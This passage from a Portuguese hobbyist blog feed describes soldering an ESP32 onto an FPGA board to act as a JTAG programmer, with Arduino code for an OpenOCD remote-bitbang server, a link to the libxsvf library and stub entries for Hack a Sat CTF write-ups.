<p><img src="/assets/posts/medium/1_sADN_JL_MLf9TP5r7FVymQ.png" alt="Conector de energia e porta serial" /><em>Conector de energia e porta serial</em></p>

<p>Então com uma fita dupla-face, prendi o ESP32 na placa e soldei os fios nos pinos certos.</p>

<p><img src="/assets/posts/medium/1_86Ir5XIqvHCLbMsbWxs5MA.png" alt="ESP32 preso com fita dupla-face e os fios soldados" /><em>ESP32 preso com fita dupla-face e os fios soldados</em></p>

<p>Agora eu só precisava escolher os pinos para o JTAG e estaria pronto para o código! Depois de procurar quais pinos “seguros” eu poderia usar no ESP32, eu escolhi estes pinos:</p>

<ul>
  <li>TDI =&gt; D33</li>
  <li>TDO =&gt; D32</li>
  <li>TCK =&gt; D27</li>
  <li>TMS =&gt; D26</li>
</ul>

<p>E soldei do melhor jeito que pude.</p>

<p><img src="https://cdn-images-1.medium.com/max/2544/0_ERp9fzhTj8EL0i1G" alt="Pinos JTAG soldados" /></p>

<p>Eu também tive que soldar o pino GND do ESP32 no pino GND do JTAG (Eu tive um problema com FT232R que foi solucionado soldando o GND)</p>

<p><img src="/assets/posts/medium/1_Ltxy34-3hHoAalgDOHqG7A.png" alt="Alimentação do JTAG" /><em>Alimentação do JTAG</em></p>

<p><img src="/assets/posts/medium/1_Sae7vuGGrvCUuYZdOiGPVA.png" alt="Fio GND soldado" /><em>Fio GND soldado</em></p>

<p>Com todos os fios soldados, eu podia começar a brincar com software!</p>

<p>Primeiro eu tentei usar a função Remote Bitbang do OpenOCD, o qual conecta em um socket TCP e começa a emitir comandos de bitbang usando um caracter ASCII. Por alguma razão, eu não consegui fazer funcionar. Se você quiser tentar, esse foi o código rodando no ESP32:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;WiFi.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">ssid</span>     <span class="o">=</span> <span class="s">"XX"</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">password</span> <span class="o">=</span> <span class="s">"XX"</span><span class="p">;</span>

<span class="n">WiFiServer</span> <span class="nf">server</span><span class="p">(</span><span class="mi">3335</span><span class="p">);</span>

<span class="cp">#define PIN_SRST 21
#define PIN_TDI 33
#define PIN_TDO 32
#define PIN_TCK 27
#define PIN_TMS 26
#define PIN_LED 2
</span>
<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>
    <span class="n">delay</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>

    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TDO</span><span class="p">,</span> <span class="n">INPUT_PULLUP</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="c1">// We start by connecting to a WiFi network</span>

    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">();</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">();</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"Connecting to "</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">ssid</span><span class="p">);</span>

    <span class="n">WiFi</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="n">ssid</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">WiFi</span><span class="p">.</span><span class="n">status</span><span class="p">()</span> <span class="o">!=</span> <span class="n">WL_CONNECTED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"."</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"WiFi connected."</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"IP address: "</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">WiFi</span><span class="p">.</span><span class="n">localIP</span><span class="p">());</span>
    <span class="n">server</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">WiFiClient</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="n">available</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">)</span> <span class="p">{</span>                     <span class="c1">// if you get a client,</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"New Client."</span><span class="p">);</span>  <span class="c1">// print a message out the serial port</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">connected</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">available</span><span class="p">())</span> <span class="p">{</span>
                <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">read</span><span class="p">();</span>
                <span class="k">switch</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="sc">'B'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'b'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'R'</span><span class="p">:</span>
                      <span class="n">client</span><span class="p">.</span><span class="n">print</span><span class="p">((</span><span class="n">digitalRead</span><span class="p">(</span><span class="n">PIN_TDO</span><span class="p">)</span> <span class="o">==</span> <span class="n">HIGH</span><span class="p">)</span> <span class="o">?</span> <span class="sc">'1'</span> <span class="o">:</span> <span class="sc">'0'</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'Q'</span><span class="p">:</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'0'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'6'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'r'</span><span class="p">:</span>
                    <span class="k">case</span> <span class="sc">'t'</span><span class="p">:</span>
                      <span class="c1">// SRST=0, which confusingly means to *exit* reset (as /RESET and /TRST are active-low)</span>
                      <span class="c1">// We don't have a TRST connection, so 'r' and 't' do the same thing.</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="c1">//digitalWrite(PIN_CHIP_EN, HIGH);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'s'</span><span class="p">:</span>
                    <span class="k">case</span> <span class="sc">'u'</span><span class="p">:</span>
                      <span class="c1">// SRST=1 -- enter RESET state</span>
                      <span class="c1">// Likewise for 's' and 'u'.</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="c1">//digitalWrite(PIN_CHIP_EN, LOW);</span>
                      <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Client disconnected"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ontem alguém me mandou um link que não era relacionado ao tópico, mas me fez encontrar essa biblioteca:
<a href="http://www.clifford.at/libxsvf/"><strong>Lib(X)SVF - A library for implementing SVF and XSVF JTAG players</strong>
<em>JTAG (IEEE 1149.1, aka “Boundary Scan”) is a standard IC testing, debugging and programming port. SVF (Serial Vector…</em>www.clifford.at</a></p>

<p>Basicamente ela foi escrita pela mesma pessoa que fez a engenharia reversa do bistream dos FPGA ICE40 (e muitos outros) e era uma biblioteca para reproduzir arquivos SVF e XSVF. Foi bem simples implementar um programador usando o ESP32. Você apenas precisava implementar algumas funções e tudo funcionava.</p>

<p>Teve muito trabalho para deixar legal de usar, então eu não vou explicar em detalhes aqui. Porém o código fonte está disponível aqui: <a href="https://github.com/racerxdl/esp32-rjtag">https://github.com/racerxdl/esp32-rjtag</a></p>

<p>Você roda:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload.py /dev/ttyUSB0 file.svf
</code></pre></div></div>

<p>E ele irá gravar o FPGA para você. Aqui está um video disso funcionando:</p>

<center>
  <blockquote class="twitter-tweet"><p lang="en" dir="ltr">FINALLY. Now I can use the ESP32 as JTAG programmer for Lattice FPGA. Soon I will able to program through wifi and pipe a serial debug port as well. <a href="https://t.co/zs41v47BvU">pic.twitter.com/zs41v47BvU</a></p>&mdash; Cybernetic Lover (@lucasteske) <a href="https://twitter.com/lucasteske/status/1272019368617095173?ref_src=twsrc%5Etfw">June 14, 2020</a></blockquote> <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>

<p>Eu também adicionei um comando para fazer o ESP32 mudar do modo de programação para o passthorugh serial. Desta maneira, após a gravação do FPGA, todas as chamadas serial seriam redirecionadas para o FPGA. Para testar eu fiz esse pequeno Hello World Serial:
<a href="https://github.com/racerxdl/fpga-serial-hello"><strong>racerxdl/fpga-serial-hello</strong></a></p>

<p>O qual fica enviando a mensagem “Hello World” pela porta serial para sempre. E funciona!
Which basically keeps sending Hello World through the serial port forever.</p>

<p><img src="/assets/posts/medium/1_Z8RdW5i7NQh7KUEC5v5NFg.png" alt="Saída do Hello World do FPGA" /><em>Saída do Hello World do FPGA</em></p>

<p>Meu próximo passo é fazer funcionar via rede. Vai ser muito bom poder gravar o FPGA via rede e usar a porta serial.</p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="FPGA" /><category term="ESP32" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="ESP32" /><category term="Colorlight" /><summary type="html"><![CDATA[Hackeando um ESP32 num FPGA]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Talk to me, Goose</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/" rel="alternate" type="text/html" title="Hack a Sat - Talk to me, Goose" /><published>2020-05-31T22:02:00+00:00</published><updated>2020-05-31T22:02:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goos</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/"><![CDATA[<p>Somente disponível em <a href="/2020/05/hack-a-sat-talk-to-me-goose/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="XTCE" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Phasors to Stun</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/" rel="alternate" type="text/html" title="Hack a Sat - Phasors to Stun" /><published>2020-05-30T16:15:00+00:00</published><updated>2020-05-30T16:15:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/"><![CDATA[<p>Somente disponível em <a href="/2020/05/hack-a-sat-phasors-to-stun/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="SDR" /><category term="GNU Radio" /><category term="Radio" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>